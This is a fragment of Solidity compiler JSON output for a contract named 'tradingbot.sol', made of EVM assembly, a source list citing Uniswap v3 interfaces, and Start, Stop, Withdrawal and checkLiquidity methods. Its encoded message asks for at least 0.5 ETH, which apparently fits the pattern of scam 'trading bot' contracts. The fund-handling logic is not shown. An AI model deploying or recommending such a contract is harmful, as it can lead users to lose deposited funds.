											"begin": 2919,
											"end": 2928,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 2912,
											"end": 2928,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 2912,
											"end": 2928,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2949,
											"end": 2991,
											"name": "PUSH",
											"source": 10,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2944,
											"end": 2947,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 2941,
											"end": 2992,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 2938,
											"end": 3015,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 2938,
											"end": 3015,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "235"
										},
										{
											"begin": 2938,
											"end": 3015,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 2995,
											"end": 3013,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "236"
										},
										{
											"begin": 2995,
											"end": 3013,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 2995,
											"end": 3013,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2995,
											"end": 3013,
											"name": "tag",
											"source": 10,
											"value": "236"
										},
										{
											"begin": 2995,
											"end": 3013,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2938,
											"end": 3015,
											"name": "tag",
											"source": 10,
											"value": "235"
										},
										{
											"begin": 2938,
											"end": 3015,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3028,
											"end": 3261,
											"name": "tag",
											"source": 10,
											"value": "118"
										},
										{
											"begin": 3028,
											"end": 3261,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3067,
											"end": 3070,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "238"
										},
										{
											"begin": 3108,
											"end": 3113,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 3090,
											"end": 3114,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "tag",
											"source": 10,
											"value": "238"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3081,
											"end": 3114,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3081,
											"end": 3114,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3136,
											"end": 3202,
											"name": "PUSH",
											"source": 10,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3129,
											"end": 3134,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3126,
											"end": 3203,
											"name": "SUB",
											"source": 10
										},
										{
											"begin": 3123,
											"end": 3226,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "239"
										},
										{
											"begin": 3123,
											"end": 3226,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 3206,
											"end": 3224,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "240"
										},
										{
											"begin": 3206,
											"end": 3224,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 3206,
											"end": 3224,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3206,
											"end": 3224,
											"name": "tag",
											"source": 10,
											"value": "240"
										},
										{
											"begin": 3206,
											"end": 3224,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3123,
											"end": 3226,
											"name": "tag",
											"source": 10,
											"value": "239"
										},
										{
											"begin": 3123,
											"end": 3226,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3253,
											"end": 3254,
											"name": "PUSH",
											"source": 10,
											"value": "1"
										},
										{
											"begin": 3246,
											"end": 3251,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3242,
											"end": 3255,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 3235,
											"end": 3255,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 3235,
											"end": 3255,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3028,
											"end": 3261,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3028,
											"end": 3261,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 3028,
											"end": 3261,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3028,
											"end": 3261,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3267,
											"end": 3447,
											"name": "tag",
											"source": 10,
											"value": "195"
										},
										{
											"begin": 3267,
											"end": 3447,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3315,
											"end": 3392,
											"name": "PUSH",
											"source": 10,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3312,
											"end": 3313,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3305,
											"end": 3393,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 3412,
											"end": 3416,
											"name": "PUSH",
											"source": 10,
											"value": "12"
										},
										{
											"begin": 3409,
											"end": 3410,
											"name": "PUSH",
											"source": 10,
											"value": "4"
										},
										{
											"begin": 3402,
											"end": 3417,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 3436,
											"end": 3440,
											"name": "PUSH",
											"source": 10,
											"value": "24"
										},
										{
											"begin": 3433,
											"end": 3434,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3426,
											"end": 3441,
											"name": "REVERT",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "tag",
											"source": 10,
											"value": "120"
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3493,
											"end": 3494,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3510,
											"end": 3530,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "243"
										},
										{
											"begin": 3528,
											"end": 3529,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3510,
											"end": 3530,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 3510,
											"end": 3530,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3510,
											"end": 3530,
											"name": "tag",
											"source": 10,
											"value": "243"
										},
										{
											"begin": 3510,
											"end": 3530,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3505,
											"end": 3530,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3505,
											"end": 3530,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3544,
											"end": 3564,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "244"
										},
										{
											"begin": 3562,
											"end": 3563,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 3544,
											"end": 3564,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 3544,
											"end": 3564,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3544,
											"end": 3564,
											"name": "tag",
											"source": 10,
											"value": "244"
										},
										{
											"begin": 3544,
											"end": 3564,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3539,
											"end": 3564,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 3539,
											"end": 3564,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3583,
											"end": 3584,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3573,
											"end": 3608,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "245"
										},
										{
											"begin": 3573,
											"end": 3608,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 3588,
											"end": 3606,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "246"
										},
										{
											"begin": 3588,
											"end": 3606,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "195"
										},
										{
											"begin": 3588,
											"end": 3606,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3588,
											"end": 3606,
											"name": "tag",
											"source": 10,
											"value": "246"
										},
										{
											"begin": 3588,
											"end": 3606,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3573,
											"end": 3608,
											"name": "tag",
											"source": 10,
											"value": "245"
										},
										{
											"begin": 3573,
											"end": 3608,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3630,
											"end": 3631,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3627,
											"end": 3628,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3623,
											"end": 3632,
											"name": "DIV",
											"source": 10
										},
										{
											"begin": 3618,
											"end": 3632,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 3618,
											"end": 3632,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3453,
											"end": 3638,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3644,
											"end": 3824,
											"name": "tag",
											"source": 10,
											"value": "123"
										},
										{
											"begin": 3644,
											"end": 3824,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3692,
											"end": 3769,
											"name": "PUSH",
											"source": 10,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3689,
											"end": 3690,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3682,
											"end": 3770,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 3789,
											"end": 3793,
											"name": "PUSH",
											"source": 10,
											"value": "41"
										},
										{
											"begin": 3786,
											"end": 3787,
											"name": "PUSH",
											"source": 10,
											"value": "4"
										},
										{
											"begin": 3779,
											"end": 3794,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 3813,
											"end": 3817,
											"name": "PUSH",
											"source": 10,
											"value": "24"
										},
										{
											"begin": 3810,
											"end": 3811,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3803,
											"end": 3818,
											"name": "REVERT",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "tag",
											"source": 10,
											"value": "129"
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3862,
											"end": 3863,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 3879,
											"end": 3899,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "249"
										},
										{
											"begin": 3897,
											"end": 3898,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3879,
											"end": 3899,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 3879,
											"end": 3899,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3879,
											"end": 3899,
											"name": "tag",
											"source": 10,
											"value": "249"
										},
										{
											"begin": 3879,
											"end": 3899,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3874,
											"end": 3899,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3874,
											"end": 3899,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3913,
											"end": 3933,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "250"
										},
										{
											"begin": 3931,
											"end": 3932,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 3913,
											"end": 3933,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 3913,
											"end": 3933,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3913,
											"end": 3933,
											"name": "tag",
											"source": 10,
											"value": "250"
										},
										{
											"begin": 3913,
											"end": 3933,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3908,
											"end": 3933,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 3908,
											"end": 3933,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3952,
											"end": 3953,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3942,
											"end": 3977,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "251"
										},
										{
											"begin": 3942,
											"end": 3977,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 3957,
											"end": 3975,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "252"
										},
										{
											"begin": 3957,
											"end": 3975,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "195"
										},
										{
											"begin": 3957,
											"end": 3975,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 3957,
											"end": 3975,
											"name": "tag",
											"source": 10,
											"value": "252"
										},
										{
											"begin": 3957,
											"end": 3975,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3942,
											"end": 3977,
											"name": "tag",
											"source": 10,
											"value": "251"
										},
										{
											"begin": 3942,
											"end": 3977,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 3998,
											"end": 3999,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3995,
											"end": 3996,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 3991,
											"end": 4000,
											"name": "MOD",
											"source": 10
										},
										{
											"begin": 3986,
											"end": 4000,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 3986,
											"end": 4000,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 3830,
											"end": 4006,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "tag",
											"source": 10,
											"value": "133"
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4052,
											"end": 4056,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 4072,
											"end": 4092,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "254"
										},
										{
											"begin": 4090,
											"end": 4091,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4072,
											"end": 4092,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 4072,
											"end": 4092,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4072,
											"end": 4092,
											"name": "tag",
											"source": 10,
											"value": "254"
										},
										{
											"begin": 4072,
											"end": 4092,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4067,
											"end": 4092,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4106,
											"end": 4126,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "255"
										},
										{
											"begin": 4124,
											"end": 4125,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 4106,
											"end": 4126,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 4106,
											"end": 4126,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4106,
											"end": 4126,
											"name": "tag",
											"source": 10,
											"value": "255"
										},
										{
											"begin": 4106,
											"end": 4126,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4101,
											"end": 4126,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4101,
											"end": 4126,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4150,
											"end": 4151,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4147,
											"end": 4148,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4143,
											"end": 4152,
											"name": "SUB",
											"source": 10
										},
										{
											"begin": 4135,
											"end": 4152,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 4135,
											"end": 4152,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4174,
											"end": 4175,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 4168,
											"end": 4172,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 4165,
											"end": 4176,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 4162,
											"end": 4199,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 4162,
											"end": 4199,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "256"
										},
										{
											"begin": 4162,
											"end": 4199,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 4179,
											"end": 4197,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "257"
										},
										{
											"begin": 4179,
											"end": 4197,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 4179,
											"end": 4197,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4179,
											"end": 4197,
											"name": "tag",
											"source": 10,
											"value": "257"
										},
										{
											"begin": 4179,
											"end": 4197,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4162,
											"end": 4199,
											"name": "tag",
											"source": 10,
											"value": "256"
										},
										{
											"begin": 4162,
											"end": 4199,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4012,
											"end": 4206,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4212,
											"end": 4298,
											"name": "tag",
											"source": 10,
											"value": "196"
										},
										{
											"begin": 4212,
											"end": 4298,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4247,
											"end": 4254,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 4287,
											"end": 4291,
											"name": "PUSH",
											"source": 10,
											"value": "FF"
										},
										{
											"begin": 4280,
											"end": 4285,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4276,
											"end": 4292,
											"name": "AND",
											"source": 10
										},
										{
											"begin": 4265,
											"end": 4292,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 4265,
											"end": 4292,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4212,
											"end": 4298,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4212,
											"end": 4298,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 4212,
											"end": 4298,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4212,
											"end": 4298,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "tag",
											"source": 10,
											"value": "180"
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4342,
											"end": 4345,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 4361,
											"end": 4379,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "260"
										},
										{
											"begin": 4377,
											"end": 4378,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4361,
											"end": 4379,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "196"
										},
										{
											"begin": 4361,
											"end": 4379,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4361,
											"end": 4379,
											"name": "tag",
											"source": 10,
											"value": "260"
										},
										{
											"begin": 4361,
											"end": 4379,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4356,
											"end": 4379,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4356,
											"end": 4379,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4393,
											"end": 4411,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "261"
										},
										{
											"begin": 4409,
											"end": 4410,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 4393,
											"end": 4411,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "196"
										},
										{
											"begin": 4393,
											"end": 4411,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4393,
											"end": 4411,
											"name": "tag",
											"source": 10,
											"value": "261"
										},
										{
											"begin": 4393,
											"end": 4411,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4388,
											"end": 4411,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4388,
											"end": 4411,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4434,
											"end": 4435,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4431,
											"end": 4432,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4427,
											"end": 4436,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 4420,
											"end": 4436,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 4420,
											"end": 4436,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4457,
											"end": 4461,
											"name": "PUSH",
											"source": 10,
											"value": "FF"
										},
										{
											"begin": 4452,
											"end": 4455,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 4449,
											"end": 4462,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 4446,
											"end": 4485,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 4446,
											"end": 4485,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "262"
										},
										{
											"begin": 4446,
											"end": 4485,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 4465,
											"end": 4483,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "263"
										},
										{
											"begin": 4465,
											"end": 4483,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 4465,
											"end": 4483,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4465,
											"end": 4483,
											"name": "tag",
											"source": 10,
											"value": "263"
										},
										{
											"begin": 4465,
											"end": 4483,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4446,
											"end": 4485,
											"name": "tag",
											"source": 10,
											"value": "262"
										},
										{
											"begin": 4446,
											"end": 4485,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4304,
											"end": 4492,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "tag",
											"source": 10,
											"value": "186"
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4536,
											"end": 4540,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 4556,
											"end": 4574,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "265"
										},
										{
											"begin": 4572,
											"end": 4573,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4556,
											"end": 4574,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "196"
										},
										{
											"begin": 4556,
											"end": 4574,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4556,
											"end": 4574,
											"name": "tag",
											"source": 10,
											"value": "265"
										},
										{
											"begin": 4556,
											"end": 4574,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4551,
											"end": 4574,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4551,
											"end": 4574,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4588,
											"end": 4606,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "266"
										},
										{
											"begin": 4604,
											"end": 4605,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 4588,
											"end": 4606,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "196"
										},
										{
											"begin": 4588,
											"end": 4606,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4588,
											"end": 4606,
											"name": "tag",
											"source": 10,
											"value": "266"
										},
										{
											"begin": 4588,
											"end": 4606,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4583,
											"end": 4606,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4583,
											"end": 4606,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4630,
											"end": 4631,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4627,
											"end": 4628,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 4623,
											"end": 4632,
											"name": "SUB",
											"source": 10
										},
										{
											"begin": 4615,
											"end": 4632,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 4615,
											"end": 4632,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4654,
											"end": 4658,
											"name": "PUSH",
											"source": 10,
											"value": "FF"
										},
										{
											"begin": 4648,
											"end": 4652,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 4645,
											"end": 4659,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 4642,
											"end": 4682,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 4642,
											"end": 4682,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "267"
										},
										{
											"begin": 4642,
											"end": 4682,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 4662,
											"end": 4680,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "268"
										},
										{
											"begin": 4662,
											"end": 4680,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 4662,
											"end": 4680,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 4662,
											"end": 4680,
											"name": "tag",
											"source": 10,
											"value": "268"
										},
										{
											"begin": 4662,
											"end": 4680,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4642,
											"end": 4682,
											"name": "tag",
											"source": 10,
											"value": "267"
										},
										{
											"begin": 4642,
											"end": 4682,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 4498,
											"end": 4689,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										}
									],
									".data": {
										"66BA267ED9E689F4F612725CA4739F673C4421CA078AB0323046FA1DC83ED02A": "4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732e"
									}
								}
							},
							"sourceList": [
								"contracts/tradingbot.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
								"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"Start()": "1b55ba3a",
							"Stop()": "bedf0f4a",
							"Withdrawal()": "70e44c6a",
							"checkLiquidity()": "d82c52d6"
						}
					},
